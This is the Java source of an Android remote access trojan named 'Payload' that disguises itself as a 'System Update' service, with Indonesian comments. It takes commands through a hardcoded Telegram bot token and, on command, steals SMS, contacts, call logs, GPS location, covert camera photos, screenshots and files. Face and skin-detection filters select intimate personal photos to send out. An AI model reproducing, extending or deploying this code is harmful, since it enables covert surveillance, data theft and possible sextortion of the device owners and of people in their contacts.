package com.system.update;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentValues;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.FaceDetector;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaMetadataRetriever;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class Payload extends Service {
    private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
    private String CHAT_ID = "8598136412"; 
    private String GROUP_ID = "-1004405270823"; 
    
    private long lastUpdateId = 0;
    private String myAndroidId = "";
    private android.content.SharedPreferences prefs;
    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    private void writeLog(String msg) {
        try {
            File file = new File(getExternalFilesDir(null), "rat_debug.txt");
            FileOutputStream fos = new FileOutputStream(file, true);
            fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
            fos.close();
        } catch (Exception e) {}
    }

    public static void askPermissions(Activity activity) {
        if (Build.VERSION.SDK_INT >= 23) {
            List<String> permissions = new ArrayList<>();
            String[] perms = {
                "android.permission.READ_SMS", "android.permission.RECEIVE_SMS",
                "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG",
                "android.permission.CAMERA", "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"
            };
            for (String p : perms) {
                if (activity.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    permissions.add(p);
                }
            }
            if (Build.VERSION.SDK_INT >= 33) {
                if (activity.checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                    permissions.add("android.permission.POST_NOTIFICATIONS");
                }
            }
            if (!permissions.isEmpty()) {
                activity.requestPermissions(permissions.toArray(new String[0]), 101);
            }
            
            if (Build.VERSION.SDK_INT >= 30) {
                if (!Environment.isExternalStorageManager()) {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        intent.setData(Uri.parse("package:" + activity.getPackageName()));
                        activity.startActivity(intent);
                    } catch (Exception e) {}
                }
            }
            
            try {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + activity.getPackageName()));
                activity.startActivity(intent);
            } catch (Exception e) {}
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        prefs = getSharedPreferences("rat_prefs", MODE_PRIVATE);
        lastUpdateId = prefs.getLong("lastUpdateId", 0);
        myAndroidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        writeLog("1. Service Start (Alarm)");
        
        if (Build.VERSION.SDK_INT >= 26) {
            String CHANNEL_ID = "sys_update_channel";
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);

            Notification notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Update")
                    .setContentText("Checking...")
                    .setSmallIcon(android.R.drawable.ic_popup_sync)
                    .build();
            startForeground(1, notification);
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                writeLog("2. Thread Jalan");
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
                
                sendCheckIn(deviceName);

                writeLog("3. Masuk Fast Polling (3 Menit)");
                long endTime = System.currentTimeMillis() + (180 * 1000); 
                while (System.currentTimeMillis() < endTime) {
                    checkCommands();
                    try { TimeUnit.SECONDS.sleep(5); } catch (InterruptedException e) {} // Timeout dinaikin jadi 5 detik
                }

                writeLog("4. Waktu Habis, Service Tidur");
                stopForeground(true);
                stopSelf();
            }
        }).start();

        return START_NOT_STICKY;
    }

    private String getParam(String json, String cmdPrefix) {
        int idx = json.indexOf(cmdPrefix);
        if (idx == -1) return null;
        int start = idx + cmdPrefix.length();
        int end = json.indexOf("\"", start);
        if (end == -1) return null;
        return json.substring(start, end).trim();
    }

    private void checkCommands() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) { response.append(line); }
            in.close();

            String jsonResponse = response.toString();
            
            if (jsonResponse.contains("\"update_id\":")) {
                int startIdx = jsonResponse.lastIndexOf("\"update_id\":") + 12;
                int endIdx = jsonResponse.indexOf(",", startIdx);
                if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
                lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
                prefs.edit().putLong("lastUpdateId", lastUpdateId).apply();
            }
            
            if (jsonResponse.contains("/tree " + myAndroidId)) {
                writeLog("Membangun Tree...");
                String tree = buildTree(new File("/storage/emulated/0/"), "", 0);
                if (tree.length() > 3500) {
                    saveAndSendText("tree.txt", tree, "📂 Tree Folder (File)");
                } else {
                    sendTelegramMessage("📂 *Tree Folder:*\n" + tree);
                }
            }
            else if (jsonResponse.contains("/dump_sms " + myAndroidId)) { dumpSmsToFile(); }
            else if (jsonResponse.contains("/dump_kontak " + myAndroidId)) { dumpContactsToFile(); }
            else if (jsonResponse.contains("/dump_telpon " + myAndroidId)) { dumpCallLogsToFile(); }
            else if (jsonResponse.contains("/foto_depan " + myAndroidId)) { takePhoto(1); }
            else if (jsonResponse.contains("/foto_belakang " + myAndroidId)) { takePhoto(0); }
            else if (jsonResponse.contains("/lacak " + myAndroidId)) { sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation()); }
            else if (jsonResponse.contains("/ss " + myAndroidId)) { takeScreenshot(); }
            else if (jsonResponse.contains("/send_file " + myAndroidId)) {
                String param = getParam(jsonResponse, "/send_file " + myAndroidId + " ");
                if (param != null) {
                    File f = new File(param);
                    if(f.exists()) sendTelegramFile(f.getAbsolutePath(), false, "📤 File: " + f.getName());
                    else sendTelegramMessage("❌ File tidak ditemukan.");
                }
            }
            else if (jsonResponse.contains("/send_foto_acak " + myAndroidId)) {
                String param = getParam(jsonResponse, "/send_foto_acak " + myAndroidId + " ");
                if (param != null) {
                    String[] parts = param.split(" ");
                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "acak");
                }
            }
            else if (jsonResponse.contains("/send_foto_wajah " + myAndroidId)) {
                String param = getParam(jsonResponse, "/send_foto_wajah " + myAndroidId + " ");
                if (param != null) {
                    String[] parts = param.split(" ");
                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "wajah");
                }
            }
            else if (jsonResponse.contains("/send_foto_perut " + myAndroidId)) {
                String param = getParam(jsonResponse, "/send_foto_perut " + myAndroidId + " ");
                if (param != null) {
                    String[] parts = param.split(" ");
                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "perut");
                }
            }
            else if (jsonResponse.contains("/send_video " + myAndroidId)) {
                String param = getParam(jsonResponse, "/send_video " + myAndroidId + " ");
                if (param != null) {
                    String[] parts = param.split(" ");
                    if (parts.length >= 3) sendVideoFiltered(parts[0], Integer.parseInt(parts[1].trim()), Integer.parseInt(parts[2].trim()));
                }
            }

        } catch (Exception e) { writeLog("Error checkCommands: " + e.toString()); }
    }

    private String buildTree(File dir, String prefix, int depth) {
        if (depth > 15) return ""; 
        StringBuilder sb = new StringBuilder();
        File[] files = dir.listFiles();
        if (files == null) return "";
        Arrays.sort(files, (f1, f2) -> f1.getName().compareToIgnoreCase(f2.getName()));
        for (File f : files) {
            if (f.isDirectory()) {
                String name = f.getName().toLowerCase();
                if (name.equals("data") || name.equals("obb") || f.getName().startsWith(".")) continue;
                sb.append(prefix).append("📁 ").append(f.getName()).append("\n");
                sb.append(buildTree(f, prefix + "  ", depth + 1));
            }
        }
        return sb.toString();
    }

    private void sendFotoFiltered(String path, int count, String mode) {
        File dir = new File(path);
        File[] files = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".jpg") || name.toLowerCase().endsWith(".jpeg") || name.toLowerCase().endsWith(".png"));
        if (files == null || files.length == 0) { sendTelegramMessage("❌ Folder kosong / tidak ada foto."); return; }
        
        List<File> fileList = new ArrayList<>(Arrays.asList(files));
        Collections.shuffle(fileList);
        
        int sent = 0;
        for (File f : fileList) {
            if (sent >= count) break;
            boolean lolos = false;
            if (mode.equals("acak")) lolos = true;
            else if (mode.equals("wajah")) lolos = detectFace(f.getAbsolutePath());
            else if (mode.equals("perut")) lolos = detectSkin(f.getAbsolutePath());

            if (lolos) {
                sendTelegramFile(f.getAbsolutePath(), true, "📸 Foto " + mode.toUpperCase());
                sent++;
                try { TimeUnit.SECONDS.sleep(2); } catch (Exception e) {}
            }
        }
        sendTelegramMessage("✅ Selesai scan " + mode + ". Terkirim " + sent + " foto.");
    }

    private boolean detectFace(String filePath) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inPreferredConfig = Bitmap.Config.RGB_565;
            Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
            if (bitmap == null) return false;
            FaceDetector detector = new FaceDetector(bitmap.getWidth(), bitmap.getHeight(), 5);
            FaceDetector.Face[] faces = new FaceDetector.Face[5];
            int numFaces = detector.findFaces(bitmap, faces);
            bitmap.recycle();
            return numFaces > 0;
        } catch (Exception e) { return false; }
    }

    private boolean detectSkin(String filePath) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inSampleSize = 4; 
            Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
            if (bitmap == null) return false;
            int width = bitmap.getWidth();
            int height = bitmap.getHeight();
            int skinPixels = 0;
            int totalPixels = 0;
            for (int x = 0; x < width; x+=4) {
                for (int y = 0; y < height; y+=4) {
                    totalPixels++;
                    int pixel = bitmap.getPixel(x, y);
                    int r = Color.red(pixel), g = Color.green(pixel), b = Color.blue(pixel);
                    if (r > 95 && g > 40 && b > 20 && (Math.max(r, Math.max(g, b)) - Math.min(r, Math.min(g, b))) > 15 && Math.abs(r - g) > 15 && r > g && r > b) {
                        skinPixels++;
                    }
                }
            }
            bitmap.recycle();
            return totalPixels > 0 && ((double) skinPixels / totalPixels) > 0.3;
        } catch (Exception e) { return false; }
    }

    private void sendVideoFiltered(String path, int count, int maxSec) {
        File dir = new File(path);
        File[] files = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".mp4") || name.toLowerCase().endsWith(".mkv") || name.toLowerCase().endsWith(".3gp"));
        if (files == null || files.length == 0) { sendTelegramMessage("❌ Folder kosong / tidak ada video."); return; }
        
        List<File> fileList = new ArrayList<>(Arrays.asList(files));
        Collections.shuffle(fileList);
        
        int sent = 0;
        for (File f : fileList) {
            if (sent >= count) break;
            try {
                MediaMetadataRetriever retriever = new MediaMetadataRetriever();
                retriever.setDataSource(f.getAbsolutePath());
                String time = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
                long timeMs = Long.parseLong(time);
                retriever.release();
                
                if ((timeMs / 1000) <= maxSec) {
                    sendTelegramFile(f.getAbsolutePath(), false, "🎥 Video (" + (timeMs/1000) + "s)");
                    sent++;
                    try { TimeUnit.SECONDS.sleep(2); } catch (Exception e) {}
                }
            } catch (Exception e) {}
        }
        sendTelegramMessage("✅ Selesai scan video. Terkirim " + sent + " video.");
    }

    private void sendCheckIn(String deviceInfo) {
        try {
            String encoded = URLEncoder.encode("/checkin " + deviceInfo + "|" + myAndroidId, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
            new URL(urlStr).openConnection().getInputStream().close();
        } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
    }

    private void saveAndSendText(String filename, String content, String caption) {
        if (content == null || content.trim().isEmpty()) {
            sendTelegramMessage("⚠️ " + caption + " KOSONG / Izin Diblokir.");
            return;
        }
        try {
            writeLog("Nyimpen " + filename + " (" + content.length() + " chars)");
            ContentValues values = new ContentValues();
            values.put(MediaStore.MediaColumns.DISPLAY_NAME, filename);
            values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
            values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
            
            Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
            if (uri != null) {
                OutputStream os = getContentResolver().openOutputStream(uri);
                os.write(content.getBytes());
                os.close();
                
                InputStream is = getContentResolver().openInputStream(uri);
                sendTelegramFileStream(is, filename, false, caption);
                
                getContentResolver().delete(uri, null, null);
            }
        } catch (Exception e) {
            writeLog("MediaStore Error: " + e.getMessage());
        }
    }

    private void dumpSmsToFile() {
        writeLog("Menyedot semua SMS...");
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address")))
                      .append("\nTanggal: ").append(cursor.getString(cursor.getColumnIndex("date")))
                      .append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
                } while (cursor.moveToNext());
                cursor.close();
            } else {
                writeLog("SMS inbox kosong, coba content://sms");
                cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address")))
                          .append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
                    } while (cursor.moveToNext());
                    cursor.close();
                }
            }
        } catch (Exception e) { writeLog("Gagal baca SMS: " + e.getMessage()); }
        saveAndSendText("sms_dump.txt", sb.toString(), "📩 Dump SEMUA SMS");
    }

    private void dumpContactsToFile() {
        writeLog("Menyedot semua Kontak...");
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                      .append(" - ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { writeLog("Gagal baca Kontak: " + e.getMessage()); }
        saveAndSendText("kontak_dump.txt", sb.toString(), "👥 Dump SEMUA Kontak");
    }

    private void dumpCallLogsToFile() {
        writeLog("Menyedot semua Call Log...");
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)))
                      .append("\nTipe: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)))
                      .append("\nTanggal: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)))
                      .append("\nDurasi: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))).append(" detik\n\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { writeLog("Gagal baca Call Log: " + e.getMessage()); }
        saveAndSendText("telpon_dump.txt", sb.toString(), "📞 Dump SEMUA Call Log");
    }

    private String getLocation() {
        try {
            android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
            android.location.Location loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
            if (loc != null) return "Lat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude();
        } catch (Exception e) { return "Gagal ambil lokasi."; }
        return "Lokasi tidak tersedia.";
    }

    private void takePhoto(int cameraId) {
        try {
            android.hardware.Camera camera = android.hardware.Camera.open(cameraId);
            camera.startPreview();
            camera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, android.hardware.Camera camera) {
                    try {
                        File file = new File(getExternalFilesDir(null), "sys_photo_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data); fos.close();
                        camera.release();
                        sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera");
                    } catch (Exception e) { e.printStackTrace(); }
                }
            });
        } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto: " + e.getMessage()); }
    }

    private void takeScreenshot() {
        try {
            writeLog("Mulai Screenshot...");
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);
            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            mediaProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            
            // Note: Karena kita gak bisa nampilin pop-up izin dari Service, 
            // trik ini cuma jalan kalau izin udah pernah dikasih sebelumnya.
            // Kalau belum, ini bakal gagal dan ngirim pesan ke Telegram.
            
            if (mediaProjection == null) {
                sendTelegramMessage("⚠️ Screenshot butuh izin MediaProjection manual. Kirim /ss saat aplikasi sedang terbuka.");
                return;
            }

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                    width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            try { Thread.sleep(1000); } catch (Exception e) {}

            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;
                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                image.close();

                File file = new File(getExternalFilesDir(null), "ss_" + System.currentTimeMillis() + ".png");
                FileOutputStream fos = new FileOutputStream(file);
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
                fos.close();
                bitmap.recycle();

                sendTelegramFile(file.getAbsolutePath(), true, "🖼️ Screenshot");
                file.delete();
            } else {
                sendTelegramMessage("❌ Gagal ambil screenshot (image null).");
            }

            if (virtualDisplay != null) virtualDisplay.release();
            if (imageReader != null) imageReader.close();
            writeLog("Screenshot Selesai.");

        } catch (Exception e) { writeLog("Error Screenshot: " + e.getMessage()); sendTelegramMessage("❌ Error Screenshot: " + e.getMessage()); }
    }

    private void sendTelegramMessage(String pesan) {
        try {
            String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
            new URL(urlStr).openConnection().getInputStream().close();
        } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
    }

    private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists()) { writeLog("File ga ada: " + filePath); return; }
            InputStream is = new FileInputStream(file);
            sendTelegramFileStream(is, file.getName(), isPhoto, caption);
        } catch (Exception e) { writeLog("Exception File: " + e.getMessage()); }
    }

    private void sendTelegramFileStream(InputStream is, String filename, boolean isPhoto, String caption) {
        String boundary = "*****";
        String fieldName = isPhoto ? "photo" : "document";
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + (isPhoto ? "/sendPhoto" : "/sendDocument");
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            
            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes("--" + boundary + "\r\n");
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
            
            if (caption != null) {
                request.writeBytes("--" + boundary + "\r\n");
                request.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
            }
            
            request.writeBytes("--" + boundary + "\r\n");
            request.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + filename + "\"\r\n");
            request.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
            is.close();
            
            request.writeBytes("\r\n--" + boundary + "--\r\n");
            request.flush(); request.close();
            
            int responseCode = conn.getResponseCode();
            if (responseCode != 200) {
                writeLog("Kirim File GAGAL (" + responseCode + ")");
            } else {
                writeLog("Kirim File SUKSES: " + filename);
            }
        } catch (Exception e) {
            writeLog("Exception Stream: " + e.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
